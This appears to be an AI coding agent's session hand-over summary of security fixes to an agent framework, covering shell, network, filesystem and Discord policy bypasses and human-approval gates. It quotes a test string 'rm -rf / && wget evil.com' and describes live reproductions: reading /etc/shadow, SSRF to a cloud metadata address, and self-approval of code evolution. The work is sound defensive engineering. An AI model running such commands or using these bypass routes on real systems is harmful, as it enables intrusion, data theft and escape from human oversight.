# LAST_SESSION_SUMMARY

Date: 2026-07-10

Branch: `overhaul/missy-validation-20260710-031406`
Draft PR: https://github.com/MissyLabs/missy/pull/31

## Changed (25 checkpoints this session, full suite green after every one)

### FX-A through FX-G (validation-harness root causes) — condensed, full detail in BUILD_STATUS.md

1. Preserved/hardened the existing `voice_commands.py` fix (real trailing-comma parsing bug found and fixed).
2. **FX-A**: forced the acpx delegate provider through Missy's structured tool protocol (zero native tools, fail-closed permissions, isolated cwd, delegation envelope, leaked-marker defense). Dominant root cause behind ~30 of 43 failing validation cases.
3. **FX-B**: fixed the production memory backend mismatch — Discord conversation turns were being written to the wrong file (JSON store instead of `SQLiteMemoryStore`); identical bug found independently in `VisionMemoryBridge`.
4. **FX-D**: explicit structural current-turn boundary in the acpx prompt + fail-closed on fabricated delegate responses.
5. **FX-C**: grounded memory-ID lookups (exception vs. genuinely missing); confirmed Incus tools are fabrication-proof at the tool layer.
6. **FX-F bullet 1**: browser error classification (tool absence vs. installation vs. sandbox/kernel failure vs. real interaction error).
7. **FX-G**: safe upper bound on acpx timeout config + explicit "outcome is UNKNOWN, verify before retry" messaging. Process-group cleanup attempted but reverted (broke ~136 tests mocking `subprocess.run`) — task #17.

**All of FX-A through FX-G are now done** per the prompt's stated dependency order.

### Eighteen independent, confirmed critical security vulnerabilities (full detail in AUDIT_SECURITY.md)

Found via the same systematic audit against `~/Missy-security-review.md`. Five are "an unauthenticated/unrestricted action reachable due to a missing gate"; the rest are variations — declared tool metadata not matching reality, a security check applied asymmetrically, enforcement narrower than its own declared scope, a persistence/audit path bypassing a guarantee, or a side effect happening before its governing check.

1. **SR-1.2/1.3**: unauthenticated code-evolution self-approval (system prompt taught self-approval; Discord emoji-reaction approval had zero auth check).
2. **SR-1.12**: Discord DM-pairing self-approval bypass (any unpaired stranger, two messages, zero auth).
3. **SR-1.13 (two findings)**: Discord message-command and slash-command ingress both lacked authorization; slash commands also had cross-user session-bleeding (`session_id="discord"` hardcoded for everyone).
4. **SR-1.8**: `ShellPolicyEngine` treated an empty `allowed_commands` list as allow-all whenever `shell.enabled: true`, contradicting its own docstring and all docs. A pre-existing test asserted `rm -rf / && wget evil.com` passed policy under the default config.
5. **SR-1.5**: Incus tools' declared shell permission checked a meaningless dummy string (or, for `incus_exec`, the *guest* command) instead of the real `incus` host binary. Live-reproduced: `incus_exec(command="bash")` with only `"bash"` allowlisted ran the real host `incus exec ... -- bash -c bash`, `incus` never being authorized. Fixed via new `BaseTool.resolve_shell_command()`/`resolve_filesystem_targets()` hooks — a general mechanism, not a one-off patch.
6. **SR-1.6 (crown-jewel bypass)**: `BrowserNavigateTool` called Playwright directly, never routing through `PolicyHTTPClient`/the network policy engine. Live-reproduced: navigating to the cloud-metadata SSRF address `169.254.169.254` passed the registry's permission check with zero denial. Fixed with a `resolve_network_hosts()` hook (registry-level) plus a Playwright `context.route()` interceptor (catches redirects/subresources/JS-triggered fetches too).
7. **SR-1.4**: same pattern as SR-1.5 in `VisionCaptureTool`/`VisionBurstCaptureTool` — declared filesystem permissions but read/write targets (`source`/`save_path`/`device`) didn't match the registry's kwarg heuristic. Live-reproduced: `vision_capture(source="/etc/shadow", ...)` actually called `cv2.imread("/etc/shadow")` with zero policy check. Fixed by reusing SR-1.5's hooks.
8. **SR-1.9a**: `NetworkPolicyEngine`'s exact-hostname/domain-suffix matches allowed immediately with **zero IP verification** — DNS-rebinding defense only applied to *unmatched* hostnames. Live-reproduced with a resolver rigged to raise on any call: an allowlisted hostname passed with the resolver never invoked. Fixed by applying the same rebinding check uniformly. Also caught+fixed a real test-suite performance regression the fix introduced (6 Hypothesis tests doing unmocked live DNS, 75s→383s for affected dirs) and one real full-suite failure (a test hostname resolving via live DNS to an ICANN sentinel loopback address).
9. **SR-1.7**: `ShellPolicyEngine` only validated program names — redirection operators were never routed through the filesystem policy. Live-reproduced through the real production `shell_exec` tool: with only `"echo"` allowlisted and no write paths allowed, `echo pwned > /tmp/.../pwn.txt` **actually wrote the file to disk**. Fixed by tokenising redirect targets with POSIX-punctuation-aware `shlex` and routing them through the filesystem engine. Also found+fixed a pre-existing bug in the same code: `2>&1` was misparsed as a fake sub-command, denying that common idiom outright.
10. **SR-1.10**: `AuditLogger` wrote every event's `detail` to disk completely unredacted — display-time-only redaction elsewhere "can't repair what's already on disk." Live-reproduced: a bearer token, an AWS presigned-URL signature, and a Google-API-key-shaped URL value all appeared in plaintext in the on-disk JSONL file. Fixed with a recursive `_redact_detail()` applied at the single audit-write choke point, plus the two token-shape patterns (`bearer_token`, `basic_auth_header`, `aws_presigned_signature`) the review named explicitly.
11. **SR-1.11**: `McpManager._save_config()` rebuilt every config entry purely from live client state (`name`/`command`/`url`), silently dropping any pinned `digest`. Live-reproduced: pinned a digest, simulated a restart — the `digest` key was completely gone afterward. Fixed by having `_save_config()` recover and preserve each server's currently pinned digest from the existing on-disk config before rewriting.
12. **SR-2.4 (first §2 item — unattended-execution hazards)**: `_rewrite_heredoc_command()` wrote a model-supplied `shell_exec` heredoc body to a real temp file *before* the shell policy check. Live-reproduced: a heredoc body reading `SUPER_SECRET_TOKEN` from the environment was written to `/tmp/missy_heredoc_*.py` unconditionally, and never deleted. Fixed: interpreter now checked against real shell policy before anything is written; temp file cleaned up in a `finally` block regardless of outcome.
13. **SR-2.3**: `_tool_loop()` resolves the per-turn visible tool set once and presents it to the provider, but `_execute_tool()` — the function that actually dispatches every tool call — checked nothing against that resolved set. Live-reproduced: with `capability_mode="safe-chat"` correctly excluding `shell_exec` from the visible set, calling `_execute_tool()` directly with a `shell_exec` call still dispatched successfully. Fixed: `_tool_loop()` now threads the exact resolved `allowed_tool_names` set into every `_execute_tool()` call.
14. **SR-3.4 (first §3 item — data-integrity/availability)**: `_tool_loop()` called the paid `provider.complete_with_tools()` first and only checked budget afterward. Separately, `_single_turn()` never called `_check_budget()` at all. Live-verified both defects, then fixed by checking budget at the top of each loop iteration and adding the same check to `_single_turn()` on both sides of its call.
15. **SR-3.2 (second §3 item)**: `Summarizer._call_llm()` called `self._provider.chat(...)`, a method no provider implements (`BaseProvider` only defines `complete()`/`complete_with_tools()`). Tiers 1 and 2 of `_escalate()` raised `AttributeError` on every call, silently caught, always falling through to Tier 3 — which truncates the *prompt template string*, so every persisted "summary" in production was mostly boilerplate instruction text, not real content. Root cause of non-detection: all 3 affected test files mocked the provider as a bare `MagicMock()` with no `spec`, which auto-vivifies `.chat` instead of raising `AttributeError` like a real provider would. Live-reproduced with `MagicMock(spec=["complete", "complete_with_tools", "is_available", "name"])`: `tier_counts: {'normal': 0, 'aggressive': 0, 'fallback': 1}`, `provider.complete.called == False`. Independently re-verified the review's other two named sub-bugs against current code rather than assuming — both `_format_turns()`'s `timestamp[:19]` slicing and `compact_session()`'s `memory_store` method calls are already correct on current code, likely as a side effect of FX-B; marked "no longer applicable" rather than re-fixed. Fixed: `_call_llm()` now calls `self._provider.complete(messages, temperature=temperature, max_tokens=4096)`; corrected the stale docstring; switched all provider mocks in the 3 affected test files (plus a `FakeProvider` rename in a 4th) to `MagicMock(spec=BaseProvider)` / a real `.complete()` method, closing the mock-masking hole at its source so this class of bug can't recur silently. Live re-verified: `tier_counts: {'normal': 1, ...}`, real summary text returned. 2 new regression tests, one of which is a standalone sanity check that the `spec=BaseProvider` guard actually enforces the interface.
16. **SR-3.3 (third §3 item)**: started as a "verify before fixing" checkpoint (flagged as possibly already resolved by FX-B) but found something worse than the review's text anticipated — two independent stacked bugs meant `memory_search`/`memory_describe`/`memory_expand` had never worked in production, in any configuration, for any call. Bug 1: none of the three tools declared the `permissions: ToolPermissions` attribute `ToolRegistry._check_permissions()` requires (they carried vestigial, unused attributes instead) — every dispatch through the real registry crashed with `AttributeError` before the tool's own logic ran. Bug 2: even with that fixed, `AgentRuntime._execute_tool()` never injected the `_memory_store`/`_session_id` kwargs these tools read — dispatch would still return "Memory store is not available." Root cause of non-detection: every existing test called `tool.execute(_memory_store=store, ...)` directly, bypassing both bugs — no test had ever dispatched these tools through the real registry or runtime. Severity: `_intercept_large_content()` explicitly promises the model "Use memory_search or memory_expand to retrieve full content" after every large-tool-output truncation — a promise the runtime could never keep. Live-reproduced end-to-end via the real `AgentRuntime._execute_tool()` method: `memory_expand` on a real stored record returned `is_error=True`, "Tool execution failed due to an internal error." Confirmed via `git stash` on the pre-fix tree. Fixed: added `permissions = ToolPermissions()` to all three tools; added a `_MEMORY_RETRIEVAL_TOOL_NAMES` injection block in `_execute_tool()` mirroring the existing SR-2.4 heredoc special-case pattern, supplying `_memory_store`/`_session_id` for these three tool names only. Live re-verified all three tools now work, and `memory_search` correctly defaults to the calling session only (not all sessions) when the model omits `session_id`, while still honoring an explicit override for intentional cross-session lookups (documented, opt-in, not a leak). 10 new regression tests across two files, including dispatch through both the real `ToolRegistry` and the real `AgentRuntime._execute_tool()`.
17. **SR-3.5 (fourth §3 item, this checkpoint, closes §3)**: another "verify before fixing" checkpoint — this time the literal ask ("remove non-atomic full-file memory rewrites from production paths") turned out to already be true (`MemoryStore._save()`'s non-atomic write has 3 production construction sites, none of which ever call a write method), but the investigation found 3 unrelated, live, confirmed bugs at those same 3 call sites, all sharing FX-B's root cause. Bug 1: `summarize_session.py`'s built-in skill read from the legacy JSON `MemoryStore` instead of the production `SQLiteMemoryStore` — since FX-B moved real writes to SQLite, this always returned "no turns recorded" regardless of actual history. Bug 2: `scheduler/manager.py::cleanup_memory()` and the documented CLI command `missy sessions cleanup` both guarded their cleanup call with `hasattr(store, "cleanup")` against `MemoryStore()`, which has no such method — both always silently no-op'd, forever, in every configuration; the CLI even printed "use SQLiteMemoryStore" while a different command in the same file already correctly used it. Root cause of non-detection: every affected test patched `MemoryStore` with a bare `MagicMock()`, which auto-vivifies `.cleanup` — `hasattr()` was always `True` in tests, always `False` in production; one test suite even explicitly encoded the bug's symptom as correct, expected behavior. Fixed: switched all 3 call sites to `SQLiteMemoryStore()`; fixed `summarize_session.py`'s `_format_turns()` (assumed a `datetime` object matching the old store, crashes on the new store's `str` timestamp — now uses `[:19]` slicing matching the pattern used elsewhere in the codebase); removed the dead `hasattr` guards entirely. Deleted 3 tests that encoded the old broken behavior as correct; updated remaining tests' patch targets. Added 3 new regression tests using a **real** `SQLiteMemoryStore` against a real temp DB (not mocks) per fixed call site, confirming actual data is retrieved/deleted. Corrected a stale "the default" claim in `missy/memory/__init__.py`'s docstring.

### First product-policy decision this session: SR-2.1 (scheduled jobs' default capability_mode)

Unlike every finding above, SR-2.1 was not a mechanical bug — it's a
genuine product-policy default-value question the review itself framed
that way. Asked and confirmed with the operator before implementing,
per prompt.md's requirement not to silently change defaults affecting
existing deployments: **scheduled jobs should default to a restricted
`capability_mode`, not `"full"`.**

Reachability: `SchedulerManager._run_job()` constructed
`AgentConfig(provider=job.provider)` with no `capability_mode`
override, so every scheduled job ran with the class default (`"full"`)
— the same tool access as an interactive session, but completely
unattended, on a timer, with no human in the loop to catch a bad
action. `ScheduledJob` had no `capability_mode` field at all.

Fixed: added `ScheduledJob.capability_mode: str = "safe-chat"`
(round-tripped through serialization; a legacy `jobs.json` record
missing the field, or one with an unrecognized value, falls back to
`"safe-chat"`, never `"full"` — fail closed, absence of an explicit
value must not imply the most permissive option). Added
`SchedulerManager.add_job(capability_mode=...)` with validation
against `("full", "safe-chat", "no-tools")` (deliberately excludes
`"discord"`, a channel-specific mode). `_run_job()` now threads
`job.capability_mode` into `AgentConfig`. Added `missy schedule add
--capability-mode` (default `safe-chat`) and a `Mode` column in
`missy schedule list`. Live-verified end-to-end through a real
`SchedulerManager`: a default-created job's `_run_job()` constructs
`AgentConfig` with `capability_mode="safe-chat"`; an explicitly-`"full"`
job retains full access through the same call path. 20 new tests.

**Residual risk, called out explicitly (not hidden):** this changes
behavior for any existing deployment with scheduled jobs already
relying on implicit `"full"` access — those jobs lose shell/filesystem-
write/browser access on upgrade unless the operator explicitly re-adds
them with `--capability-mode full` (no `missy schedule edit` command
exists yet to change an existing job in place). This is a deliberate,
confirmed trade-off, not an oversight — should be called out in release
notes if this branch ships.

## Verification

```text
python3 -m pytest tests/ -q -o faulthandler_timeout=120
3 failed, 20880 passed, 13 skipped in 458.82s (0:07:38)
```

The 3 failures are exactly the known pre-existing `CameraDiscovery`
cache-TTL flakes (task #11), confirmed unrelated via `git stash` in an
earlier checkpoint and reproduced again here unchanged. Zero
regressions from this session's changes.

Full detail in `BUILD_STATUS.md`, `AUDIT_SECURITY.md`, and
`TEST_RESULTS.md` — each has one dated entry per checkpoint this
session, oldest at the bottom, nothing overwritten. (This file is
condensed to stay readable — no information is lost, it lives in the
three files above.)

## Open tasks (session-tracked, carry into next session)

- **#9** SR-1.x through SR-4.x security review remediation — this
  session covered SR-1.2/1.3, SR-1.4, SR-1.5, SR-1.6, SR-1.7, SR-1.8,
  SR-1.9a, SR-1.10, SR-1.11, SR-1.12, SR-1.13, SR-2.1, SR-2.3, SR-2.4,
  SR-3.2, SR-3.3, SR-3.4, SR-3.5 (plus SR-3.1 substantially via FX-B —
  §3 is now fully closed except SR-3.4's cross-session-aggregation
  sub-finding). Remaining: SR-1.1 (audit signing — larger cross-cutting
  change), SR-1.9b (DNS TOCTOU, substantially harder — needs connecting
  to a pinned policy-verified IP rather than re-resolving at connect
  time), **SR-2.2** (safe proactive triggers — the operator has already
  confirmed the direction: wire a real `ApprovalGate`, default to
  requiring confirmation before a proactive trigger acts; not yet
  implemented, this is the natural next checkpoint), the
  cross-session-aggregation sub-finding of SR-3.4 (a shared Discord/API
  runtime's `CostTracker` never resets between logically distinct
  sessions — separate from the ordering fix already landed), SR-4.x
  (dead/unwired features).
- **SR-1.7's launcher sub-finding** remains open — `find`/`xargs`/
  `bash`/`sudo` etc. are allowlist-able with only a warning, and
  nested shell commands inside a launcher's quoted arguments are
  structurally invisible to any static command-string parser. This is a
  product-policy decision (block launchers outright vs. runtime
  interception), not a mechanical bug fix — needs explicit product
  input before implementing.
- **#10** Full 89-case tool-specific validation backlog — not yet
  re-run against current code.
- **#11** Pre-existing vision `CameraDiscovery` cache-TTL flake (3
  tests) — confirmed present before this session's changes, unrelated,
  small isolated fix needed in `missy/vision/discovery.py`.
- **#12** Wire an authenticated Discord pairing approval endpoint —
  the SR-1.12 fix removed the vulnerable path but pairing currently has
  *no* working approval surface at all.
- **#15** `allowed_roles` Discord config field documented but never
  enforced.
- **#16** FX-F bullets 2/4: build an actual disposable, threat-modeled
  browser-test environment and rerun WB-002 through WB-007 + XT-001
  against it. This dev sandbox cannot launch a browser at all (no
  playwright installed) — confirmed live, matching the harness's own
  observation.
- **#17** FX-G process-group cleanup on acpx timeout — implementation
  works but needs the test-suite migration from mocking
  `subprocess.run` to `subprocess.Popen` done carefully in its own
  session.
- **Lesson worth remembering for future test-double changes** (from
  the SR-3.2 checkpoint): a bare `MagicMock()` with no `spec`
  auto-vivifies any attribute access, so a test that mocks a
  provider/client and calls a method name that doesn't exist on the
  real interface will silently pass forever instead of catching the
  typo — always construct interface-heavy mocks with
  `spec=<the real class>` so a renamed or nonexistent method call fails
  the test the same way it would fail in production.
- **Lesson worth remembering for future "likely already fixed"
  checkpoints** (from the SR-3.3 checkpoint): a finding flagged as
  "probably already resolved as a side effect of an earlier fix" is a
  hypothesis, not a conclusion — SR-3.3 was flagged exactly this way
  and turned out to be two independent, fully live, never-worked-at-all
  bugs (a missing `permissions` attribute crashing dispatch, plus a
  runtime that never wired a required kwarg into the tool call). Both
  had been hidden by every existing test calling `tool.execute(...)`
  directly instead of dispatching through the real registry/runtime.
  The general pattern worth checking whenever a similar flag comes up:
  does at least one existing test exercise the *real* dispatch path
  (the actual registry/runtime method a production call would go
  through), or only the tool's/function's internal logic in isolation?
  If only the latter, the "verify" step isn't optional.
- **Lesson worth remembering for future policy-engine changes** (from
  SR-1.9a's checkpoint): a security fix that adds real DNS/network
  calls to a previously-synchronous/local code path can silently turn
  into a major test-suite performance regression if fixture hostnames
  aren't mocked — always time the affected test directories before/after
  and grep for realistic-looking hostnames used as allowlist entries in
  tests before considering such a change done.
- **Also noticed, not caused by this session:** an intermittent,
  pre-existing Hypothesis-deadline flake in
  `tests/security/test_property_based_fuzz.py::TestNetworkPolicyEngineFuzz::test_check_host_never_crashes_on_arbitrary_unicode`
  (no `deadline=None`, no DNS mock, occasional slow live
  `socket.getaddrinfo()` call trips the 200ms default). Confirmed via
  `git show HEAD~5` this file predates the session and never touches
  SR-1.9a's changed code paths. Not fixed — same category as the
  already-tracked vision flake (task #11); consider bundling both into
  one small follow-up task.

## The single biggest remaining gap

**None of this session's fixes have been validated against a real or
scripted acpx delegate invocation.** All verification so far is
unit/integration-level with mocks, or against the real (but
non-LLM-calling) acpx binary for `--version`/`--help`. FX-A bullet 6
("prove end to end that representative filesystem, shell, browser,
X11, AT-SPI, vision, audio, Discord upload, memory, self_create_tool,
and code_evolve requests produce the expected registry, policy, and
audit events") is still fully open, and it's the prerequisite for
re-running most of the 89-case validation backlog with real evidence
rather than code-level reasoning about what *should* happen.

## First Next Step

If a way to safely exercise a real or scripted acpx delegate call
becomes available, prioritize FX-A bullet 6 — it unblocks re-validating
everything else. Otherwise, continue §2: SR-2.1 is done (scheduled jobs
now default to `capability_mode="safe-chat"`, operator-confirmed).
**SR-2.2 is the immediate next item and the operator has already
answered the product-policy question for it**: wire a real
`ApprovalGate` for `ProactiveManager` triggers, defaulting to requiring
confirmation before a proactive/autonomous action executes (as opposed
to keeping auto-run-by-default with better auditing, or disabling
proactive triggers by default — both alternatives were explicitly
declined). This needs: (1) finding where `ProactiveManager` triggers
currently fire unconditionally (`missy/agent/proactive.py`), (2)
finding whether `ApprovalGate` (`missy/agent/approval.py`) has a real,
usable implementation already or is itself another "advertised but
unwired" piece per SR-4.x's pattern, (3) wiring the gate into the
trigger-fire path with a sensible default (a CLI/Web TUI prompt, or an
audit-then-defer mechanism if no synchronous human-in-the-loop channel
exists at fire time — proactive triggers fire from a background
thread/timer, not a foreground interactive session, so "prompt and
block" may not be directly applicable the way it is for e.g. Discord
approval flows; this needs investigation, not an assumption). After
SR-2.2, SR-1.1 (audit signing) remains the largest §1 item; §4
(dead/unwired features) follows after §1. Given how §3's checkpoints
went (SR-3.3 and SR-3.5 were both flagged "likely already fixed" and
both turned out to hide live, confirmed, previously-undetected bugs),
keep applying the same discipline to whatever's picked up: read the
actual current code, trace actual runtime call paths, specifically
check whether any existing test exercises the *real* production
dispatch/entry point rather than just the unit under test in isolation,
and live-reproduce before declaring anything fixed, broken, or
not-applicable. Alternatively pick up one of the concrete scoped tasks
above (#11, #12, #15, #16, #17), all self-contained and not requiring a
live delegate.
